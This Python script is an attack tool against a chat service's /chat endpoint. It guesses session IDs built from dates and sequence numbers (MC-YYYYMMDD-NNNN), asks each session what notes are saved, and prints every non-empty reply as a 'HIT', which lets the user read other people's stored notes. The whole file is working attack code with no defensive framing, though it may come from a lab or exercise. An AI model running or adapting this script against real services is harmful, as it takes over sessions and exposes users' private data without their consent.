#!/usr/bin/env python3
import sys
import json
import requests
from datetime import datetime, timedelta

EMPTY_RESPONSE_MARKERS = [
    "couldn't find",
    "currently have no",
    "did not find any",
    "didn't find any",
    "do not have any",
    "do not see any",
    "don't have any",
    "don't see any",
    "haven't saved",
    "haven't stored",
    "no entries",
    "no notes",
    "no reminders",
    "no saved",
    "nothing stored",
    "unable to find",
]


def is_empty_response(text: str) -> bool:
    lower = text.lower()
    return any(marker in lower for marker in EMPTY_RESPONSE_MARKERS)


def try_session(url: str, message: str, session_id: str) -> str | None:
    headers = {"Content-Type": "application/json"}
    payload = {"message": message, "session_id": session_id}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        response.raise_for_status()
        parsed = response.json()
        text = parsed.get("response", "")
        if text and not is_empty_response(text):
            return text
        return None
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error for {session_id}: {e}")
        return None
    except json.JSONDecodeError:
        print(f"  [!] Failed to decode JSON for {session_id}")
        return None


DEFAULT_MESSAGE = "What notes do I have saved?"


def main():
    if len(sys.argv) < 2:
        print(f"Usage:\n  {sys.argv[0]} <host:port> [days_back] [seq_end] [message]")
        print(f"  echo 'message' | {sys.argv[0]} <host:port> [days_back] [seq_end]")
        print(
            f"\n  days_back  Number of days back to generate session IDs for (default: 14)"
        )
        print(f"  seq_end    Highest sequence number to try (default: 20 → 0001–0020)")
        print(f'  message    Optional. Defaults to: "{DEFAULT_MESSAGE}"')
        sys.exit(1)

    url = f"http://{sys.argv[1]}/chat"

    try:
        days_back = int(sys.argv[2]) if len(sys.argv) >= 3 else 14
    except ValueError:
        print(f"Error: days_back must be an integer, got '{sys.argv[2]}'")
        sys.exit(1)

    try:
        seq_end = int(sys.argv[3]) if len(sys.argv) >= 4 else 20
    except ValueError:
        print(f"Error: seq_end must be an integer, got '{sys.argv[3]}'")
        sys.exit(1)

    # Determine message source
    if len(sys.argv) >= 5:
        message = " ".join(sys.argv[4:])
    elif not sys.stdin.isatty():
        message = sys.stdin.read().strip()
    else:
        message = ""

    if not message:
        message = DEFAULT_MESSAGE
        print(f'No message provided. Using default: "{message}"')

    seq_start = 1

    # Build date range: oldest first, up to today
    today = datetime.today()
    dates = [today - timedelta(days=d) for d in range(days_back, -1, -1)]

    total = len(dates) * (seq_end - seq_start + 1)
    print(
        f"\nBrute-forcing {total} session IDs across {len(dates)} dates "
        f"(sequences {seq_start:04d}–{seq_end:04d})...\n"
    )

    hits = 0
    tried = 0
    try:
        for date in dates:
            date_str = date.strftime("%Y%m%d")
            for i in range(seq_start, seq_end + 1):
                session_id = f"MC-{date_str}-{i:04d}"
                print(f"  Trying {session_id} ...", end=" ", flush=True)
                result = try_session(url, message, session_id)
                tried += 1
                if result:
                    hits += 1
                    print("HIT")
                    print("---")
                    print(f"Session: {session_id}")
                    print(result)
                    print("---")
                else:
                    print("empty")
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user.")

    print(f"\nDone. {hits} non-empty response(s) found out of {tried} attempts.")


if __name__ == "__main__":
    main()
